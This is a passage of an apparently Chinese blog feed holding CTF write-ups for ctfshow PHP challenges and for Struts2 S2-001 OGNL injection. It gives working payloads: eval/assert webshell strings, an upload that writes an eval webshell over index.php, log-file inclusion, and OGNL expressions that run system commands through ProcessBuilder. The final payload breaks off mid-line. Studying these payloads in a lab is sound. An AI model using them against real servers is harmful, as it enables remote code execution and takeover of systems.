*#命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);*   *#菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd]) 密码：cmd*   usort($_GET,'asse'.'rt');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="29、智障问题"><a href="#29、智障问题" class="headerlink" title="29、智障问题"></a>29、智障问题</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们覆盖index.php即可</p><p><code>?ctf=index.php</code></p><p><code>show=%3C%3Fphp%20eval(%24_POST%5B1%5D)%3B</code></p><h2 id="30、不能使用伪协议就考虑文件包含"><a href="#30、不能使用伪协议就考虑文件包含" class="headerlink" title="30、不能使用伪协议就考虑文件包含"></a>30、不能使用伪协议就考虑文件包含</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-19 07:12:57*/</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CTFSHOW</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$vip</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">isVIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span><span class="token operator">?</span><span class="token constant boolean">TRUE</span><span class="token punctuation">:</span><span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#过滤字符</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$__CTFSHOW__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isVIP</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先利用extract($_GET);，覆盖变量$isVIP</p><p>?isVIP&#x3D;true</p><p>由于过滤了：，无法使用伪协议</p><p>所以尝试包含日志文件</p><p>POST：ctf&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p><img src="/images/image-20220812161041114-1662567087535.png" alt="image-20220812161041114"></p><h2 id="31、-autoload魔术方法的妙用"><a href="#31、-autoload魔术方法的妙用" class="headerlink" title="31、 autoload魔术方法的妙用"></a>31、 autoload魔术方法的妙用</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-19 07:12:57*/</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CTFSHOW</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$vip</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">isVIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span><span class="token operator">?</span><span class="token constant boolean">TRUE</span><span class="token punctuation">:</span><span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#过滤字符</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$__CTFSHOW__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isVIP</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"log"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?..CTFSHOW..=phpinfo</code></p><p>flag就在phpinfo中</p><h2 id="filter-var-函数"><a href="#filter-var-函数" class="headerlink" title="filter_var() 函数"></a>filter_var() 函数</h2><p>通过指定的过滤器过滤变量。</p><p>如果成功，则返回已过滤的数据，如果失败，则返回 false。</p><p>语法<br>filter_var(variable, filter, options)</p><p>参数               描述<br>variable必需。规定要过滤的变量。<br>filter可选。规定要使用的过滤器的 ID。<br>options规定包含标志&#x2F;选项的数组。检查每个过滤器可能的标志和选项。<br>PHP Filter 函数<br>PHP：指示支持该函数的最早的 PHP 版本。</p><p>函数                         描述                                  PHP<br>filter_has_var()检查是否存在指定输入类型的变量。5<br>filter_id()返回指定过滤器的 ID 号。5<br>filter_input()从脚本外部获取输入，并进行过滤。5<br>filter_input_array()从脚本外部获取多项输入，并进行过滤。5<br>filter_list()返回包含所有得到支持的过滤器的一个数组。5<br>filter_var_array()获取多项变量，并进行过滤。5<br>filter_var()获取一个变量，并进行过滤。5<br>PHP Filters<br>ID 名称描述<br>FILTER_CALLBACK调用用户自定义函数来过滤数据。<br>FILTER_SANITIZE_STRING去除标签，去除或编码特殊字符。<br>FILTER_SANITIZE_STRIPPED“string” 过滤器的别名。<br>FILTER_SANITIZE_ENCODEDURL-encode 字符串，去除或编码特殊字符。<br>FILTER_SANITIZE_SPECIAL_CHARSHTML 转义字符 ‘“&lt;&gt;&amp; 以及 ASCII 值小于 32 的字符。<br>FILTER_SANITIZE_EMAIL删除所有字符，除了字母、数字以及 !#$%&amp;’*±&#x2F;&#x3D;?^_<code>&#123;|&#125;~@.[] FILTER_SANITIZE_URL删除所有字符，除了字母、数字以及 $-_.+!*&#39;(),&#123;&#125;|//^~[]</code>&lt;&gt;#%”;&#x2F;?😡&amp;&#x3D;<br>FILTER_SANITIZE_NUMBER_INT删除所有字符，除了数字和 ±<br>FILTER_SANITIZE_NUMBER_FLOAT删除所有字符，除了数字、± 以及 .,eE。<br>FILTER_SANITIZE_MAGIC_QUOTES应用 addslashes()。<br>FILTER_UNSAFE_RAW不进行任何过滤，去除或编码特殊字符。<br>FILTER_VALIDATE_INT在指定的范围以整数验证值。<br>FILTER_VALIDATE_BOOLEAN如果是 “1”, “true”, “on” 以及 “yes”，则返回 true，如果是 “0”, “false”, “off”, “no” 以及 “”，则返回 false。否则返回 NULL。<br>FILTER_VALIDATE_FLOAT以浮点数验证值。<br>FILTER_VALIDATE_REGEXP根据 regexp，兼容 Perl 的正则表达式来验证值。<br>FILTER_VALIDATE_URL把值作为 URL 来验证。<br>FILTER_VALIDATE_EMAIL把值作为 e-mail 来验证。<br>FILTER_VALIDATE_IP把值作为 IP 地址来验证。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaStruc2</title>
      <link href="/2022/09/07/javastruc2/"/>
      <url>/2022/09/07/javastruc2/</url>
      
        <content type="html"><![CDATA[<h2 id="Struts2漏洞"><a href="#Struts2漏洞" class="headerlink" title="Struts2漏洞"></a>Struts2漏洞</h2><p>就是用工具得了</p><h2 id="判断网站使用Struts2框架"><a href="#判断网站使用Struts2框架" class="headerlink" title="判断网站使用Struts2框架"></a>判断网站使用Struts2框架</h2><p>一般攻击者在攻击之前会判断网站是Struts2编写，主要看有没有链接是.action或者.do结尾的，这是因为配置文件struts.xml指定了action的后缀</p><pre class="line-numbers language-none"><code class="language-none">&lt;constant name&#x3D;&quot;struts.action.extension&quot; value&#x3D;&quot;action,,&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是上述这个配置文件解析之后，不带后缀的uri也会被解析称为action的名字。如下：</p><p><img src="/images/15832288012188.png!small" alt="image.png"></p><p>如果配置文件中常数extension的值以逗号结尾或者有空值，指明了action可以不带后缀，那么不带后缀的uri也可能是struts2框架搭建的。</p><p><img src="/images/1583228817691.png!small" alt="image.png">如果使用Struts2的rest插件，其默认的struts-plugin.xml指定的请求后缀为xhtml,xml和json</p><pre class="line-numbers language-none"><code class="language-none">&lt;constant name&#x3D;&quot;struts.action.extension&quot; value&#x3D;&quot;xhtml,,xml,json&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据后缀不同，rest插件使用不同的处理流程，如下请求json格式的数据，框架就使用了JsonLibHandler类对输出进行处理。</p><p><img src="/images/15832288372011.png!small" alt="image.png"></p><p>xhtml和xml结尾的请求则使用HtmlHandler和XStreamHandler分别处理。所以在测试的时候，不能明确判断网站使用的是否为struts2框架时，特别是碰到后两种情况，都可以拿工具去试试运气。</p><p>工具 Struts2-Scan</p><h2 id="OGNL表达式"><a href="#OGNL表达式" class="headerlink" title="OGNL表达式"></a>OGNL表达式</h2><p><code>$&#123;&#125;</code>仅仅用来声明OGNL表达式</p><blockquote><p>OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression Language，简称为 EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。 OGNL 三要素：(以下部分摘抄互联网某处, 我觉得说得好)</p><p>1、表达式（Expression）</p><p>表达式是整个 OGNL 的核心，所有的 OGNL 操作都是针对表达式的解析后进行的。表达式会规定此次 OGNL 操作到底要干什么。我们可以看到，在上面的测试中，name、department.name 等都是表达式，表示取 name 或者 department 中的 name 的值。OGNL 支持很多类型的表达式，之后我们会看到更多。</p><p>2、根对象（Root Object）</p><p>根对象可以理解为 OGNL 的操作对象。在表达式规定了 “干什么” 以后，你还需要指定到底“对谁干”。在上面的测试代码中，user 就是根对象。这就意味着，我们需要对 user 这个对象去取 name 这个属性的值（对 user 这个对象去设置其中的 department 中的 name 属性值）。</p><p>3、上下文环境（Context）</p><p>有了表达式和根对象，我们实际上已经可以使用 OGNL 的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在 OGNL 的内部，所有的操作都会在一个特定的环境中运行，这个环境就是 OGNL 的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定 OGNL 的操作 “在哪里干”。<br>OGN L 的上下文环境是一个 Map 结构，称之为 OgnlContext。上面我们提到的根对象（Root<br>Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root<br>Object）的存取操作的表达式是不需要增加 #符号进行区分的。</p><p>表达式功能操作清单：</p><pre class="line-numbers language-none"><code class="language-none">1. 基本对象树的访问对象树的访问就是通过使用点号将对象的引用串联起来进行。例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx2. 对容器变量的访问  #符号（声明变量）对容器变量的访问，通过#符号加上表达式进行。例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx3. 使用操作符号OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, &#x2F;, ++, --, &#x3D;&#x3D;, !&#x3D;, &#x3D; 等操作符之外，还能使用 mod, in, not in等。4. 容器、数组、对象OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]同时，OGNL支持对Map的按键值查找：例如：#session[&#39;mySessionPropKey&#39;]不仅如此，OGNL还支持容器的构造的表达式：例如：&#123;&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;&#125;构造一个List，#&#123;&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;&#125;构造一个Map你也可以通过任意类对象的构造函数进行对象新建例如：new Java.net.URL(&quot;xxxxxx&#x2F;&quot;)5. 对静态方法或变量的访问  @符号（调用静态方法）要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：6. 方法调用直接通过类似Java的方法调用方式进行，你甚至可以传递参数：例如：user.getName()，group.users.size()，group.containsUser(#requestUser)7. 投影和选择OGNL支持类似数据库中的投影（projection） 和选择（selection）。投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 collection.&#123;XXX&#125;，其中XXX 是这个集合中每个元素的公共属性。例如：group.userList.&#123;username&#125;将获得某个group中的所有user的name的列表。选择就是过滤满足selection 条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.&#123;X YYY&#125;，其中X 是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：? 选择满足条件的所有元素^ 选择满足条件的第一个元素$ 选择满足条件的最后一个元素例如：group.userList.&#123;? #txxx.xxx !&#x3D; null&#125;将获得某个group中user的name不为空的user的列表。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>struts2中大量用到了这种OGNL表达式，正是由于有这种功能强大的表达式，只要当传入解析的表达式我们可以控制的时候，就可以触发漏洞。</p><h2 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h2><p>加法表达式%{1+1}成功执行</p><p> struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据。例如，在注册或登录页面中。如果提交失败，则服务器通常默认情况下将返回先前提交的数据。由于服务器用于%{value}对提交的数据执行OGNL表达式解析，因此服务器可以直接发送有效载荷来执行命令。 </p><p>了解下OGNL表达式中三个符号 %，#，$ @的含义</p><blockquote><p>%的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值<br>#的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用（访问变量，或者创建变量）<br>$主要是在Struts 2配置文件中，引用OGNL表达式</p><p>@调用静态方法或静态成员   @class@member或者@class@method(args)：</p></blockquote><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 获取tomcat路径</span><span class="token operator">%</span><span class="token punctuation">&#123;</span><span class="token string">"tomcatBinDir&#123;"</span><span class="token operator">+</span><span class="token annotation punctuation">@java.lang.System</span><span class="token annotation punctuation">@getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token punctuation">&#125;</span><span class="token comment">//输出：tomcatBinDir&#123;tomcat路径&#125;</span><span class="token comment">// 获取web路径</span><span class="token operator">%</span><span class="token punctuation">&#123;</span>#req<span class="token operator">=</span><span class="token annotation punctuation">@org.apache.struts2.ServletActionContext</span><span class="token annotation punctuation">@getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token operator">=</span>#context<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>#req<span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// 命令执行 env，flag就在其中</span><span class="token comment">//ProcessBuilder 一个java命令执行的类，传入参数为字符串的命令</span>password<span class="token operator">=</span><span class="token operator">%</span><span class="token punctuation">&#123;</span>#a<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"env"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#b<span class="token operator">=</span>#a<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span>#b<span class="token punctuation">)</span><span class="token punctuation">,</span>#d<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span>#c<span class="token punctuation">)</span><span class="token punctuation">,</span>#e<span class="token operator">=</span><span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">50000</span><span class="token punctuation">]</span><span class="token punctuation">,</span>#d<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>#e<span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token operator">=</span>#context<span class="token punctuation">.</span><span class="token function">get</span><span class="token 